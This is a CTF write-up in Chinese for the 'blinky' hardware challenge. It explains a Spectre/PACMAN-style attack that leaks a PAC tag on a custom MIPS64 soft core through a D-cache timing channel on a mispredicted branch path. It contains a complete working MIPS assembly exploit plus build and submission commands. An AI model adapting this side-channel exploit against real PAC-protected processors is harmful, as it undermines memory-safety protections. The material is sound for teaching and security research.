# blinky

## 题目简述

题目给出一套 MIPS64r6 软核的完整 RTL，允许上传位于用户区 `[0x0, 0x2000)` 的汇编程序。服务器会把上传内容与保密的内核区拼接后运行；内核中打印 flag 的函数固定在 `0x2030`。

用户态不能直接跳到内核区。间接跳转的 64 位目标指针采用如下布局：

```text
63       56 55                                           0
+-----------+-----------------------------------------------+
| 8-bit tag |              virtual address                  |
+-----------+-----------------------------------------------+
```

当 `jr` 的目标落入内核区 `[0x2000, 0x100000)` 时，处理器使用 CP0 中用户态不可读的密钥重新计算 tag。tag 错误会触发 PAC 异常，而且提交阶段还会统计这些“响亮”的失败，连续试错不能作为可靠的暴力方案。服务器为每次提交随机化 PAC 密钥，因此也不能在本地预先算出 tag。

真正的突破口位于数据加载通路。RTL 对最高字节非零的加载地址执行同一套 PAC 校验：

- tag 正确时，不读取指针中的内核地址，而是把访问重定向到用户可控的探测地址 `0x1000`；
- tag 错误时，把该操作改成 `NO_LOAD`，不访问 D-cache，并携带一个延迟到提交阶段处理的 PAC 异常；
- 分支预测错误路径上的 load 会继续流入 MEM 阶段并影响缓存，但被标记为 speculative，不写回寄存器，也不提交异常。

因此本题虽然在赛事中标为 Misc，决定性机制实际是自定义 SoC 上的推测执行与缓存侧信道，归入 `hardware-embedded` 更合适。

## 解题过程

### 关键观察

目标 tag 只有 8 位，候选空间为 $2^8=256$。困难不在候选数量，而在于错误 tag 不能以架构异常的形式逐个尝试。

可以把 PAC-gated load 放到条件分支的错误预测路径上：

1. 先把探测行 `0x1000` 从 D-cache 中驱逐。
2. 构造候选指针 `(guess << 56) | 0x2030`。
3. 训练并触发一次预测错误，使候选 load 在错误路径上执行。
4. 正确 tag 会令 `0x1000` 被加载进缓存；错误 tag 会变成 `NO_LOAD`。
5. 分支恢复后读取周期计数器，测量重新加载 `0x1000` 的延迟。

这样，PAC 校验结果被转换成了“缓存命中或未命中”，而错误候选对应的异常不会提交。

### 缓存时序 oracle

参考解法使用两路组相联 D-cache 的显式 `cache 0x01` 指令，同时驱逐 index 0 的两个 way：

```asm
cache 0x01, 0($s6)    # 0x1000，index 0 / way 0
cache 0x01, 0($gp)    # 0x1800，index 0 / way 1
```

随后让一个恒为真的 `bne` 被预测为不跳转，紧随其后的 `lw` 进入错误路径：

```asm
attack:
    bne  $v0, $zero, do_probe
    lw   $t2, 0($t1)             # 候选 PAC 指针的推测加载
```

在正确路径的 `do_probe` 中读取 MMIO 周期计数器 `0x20000000`，测量 `lw 0x1000` 的延迟。参考实现把小于 8 个周期判定为命中。由于 I-cache 与 D-cache 共用仲裁器，单次未命中延迟存在抖动，所以每个候选测量两次，只有两次都命中才接受。

### 完整用户区利用代码

下面代码可直接作为 `exploit.s`。它在一次运行中枚举 tag，找到后只执行一次真正的跨区 `jr`：

```asm
    .set noreorder
    .equ THRESH, 8

    .section .boot, "ax"
    .balign 4
    .org 0x0
_uexc:
    j    _uexc
    nop

    .org 0x0c
__start_user:
    lui  $s0, 0x2000              # cycle counter: 0x20000000
    ori  $s1, $s0, 0x10           # stdout:        0x20000010
    dli  $s4, 0x2030              # 内核 flag 函数
    dli  $s6, 0x1000              # 用户区探测行
    dli  $gp, 0x1800              # 同 index 的另一个 way
    ori  $v0, $zero, 1
    ori  $s2, $zero, 0            # 当前 tag 候选
    ori  $s3, $zero, 0            # 当前候选的命中次数
    ori  $s5, $zero, 2            # 每个候选测两次
    dli  $s7, 300                 # 安全循环上限

loop:
    cache 0x01, 0($s6)
    cache 0x01, 0($gp)

    dsll $t1, $s2, 56
    or   $t1, $t1, $s4            # (guess << 56) | 0x2030
    nop
    nop

    .balign 0x100
attack:
    bne  $v0, $zero, do_probe
    lw   $t2, 0($t1)              # 错误路径上的 PAC-gated load
    j    waste
    nop

waste:
    j    waste
    nop

do_probe:
    lw   $t2, 0($s0)
    lw   $t8, 0($s6)
    lw   $t3, 0($s0)
    subu $t3, $t3, $t2
    sltiu $t9, $t3, THRESH
    addu $s3, $s3, $t9

    addiu $s5, $s5, -1
    bne  $s5, $zero, cont
    nop

    dli  $t8, 2
    beq  $s3, $t8, found
    nop

    addiu $s2, $s2, 1
    andi $s2, $s2, 0xff
    ori  $s5, $zero, 2
    ori  $s3, $zero, 0
    addiu $s7, $s7, -1
    beq  $s7, $zero, giveup
    nop

cont:
    .balign 0x100
benign:
    bne  $v0, $zero, loop
    nop

found:
    dsll $t0, $s2, 56
    or   $t0, $t0, $s4
    jr   $t0
    nop

giveup:
    jr   $s4
    nop
```

`giveup` 处理一个容易遗漏的边界：tag 为 0 时，候选指针的最高字节也是 0，RTL 不会把该 load 识别为 PAC-gated load，因此不会产生探测行命中。若 1 到 255 全部失败，就直接以 `{tag=0, address=0x2030}` 跳转。

### 构建、提交与验证

附件提供交叉编译容器和链接脚本。把上述代码保存为 `exploit.s` 后执行：

```bash
docker build -t blinky-build .
docker run --rm -v "$PWD:/work" blinky-build exploit.s
```

构建脚本会生成用户区的 `exploit.bin` 和 `$readmemh` 格式的 `exploit.mem`。本地示例内核可用于检查内存布局和指令流水线：

```bash
./run_local.sh exploit.mem
```

真实服务每次运行都会换 PAC 密钥，因此最终验证必须提交到服务：

```bash
curl --data-binary @exploit.mem http://HOST:PORT/submit
```

服务只保留低于 `0x2000` 的用户区内容。若时序 oracle 恢复出正确 tag，最后一次 `jr` 通过认证，固定地址 `0x2030` 的内核例程会把动态 flag 输出到响应中。

## 方法总结

- 核心技巧：把 PAC 校验放入分支预测错误路径，利用“正确 tag 访问探测行、错误 tag 不访问”的差异构造 D-cache 时序 oracle。
- 识别信号：当 RTL 中存在延迟异常、错误路径 load 仍可进入缓存，以及安全检查结果会改变微架构状态时，应优先考虑 Spectre/PACMAN 类侧信道，而不是提交架构异常做暴力枚举。
- 复用要点：先驱逐同组所有 way；对有仲裁噪声的延迟做重复测量；错误路径必须没有架构提交；还要单独处理“全零 tag 不触发 gated load”这类 oracle 盲点。
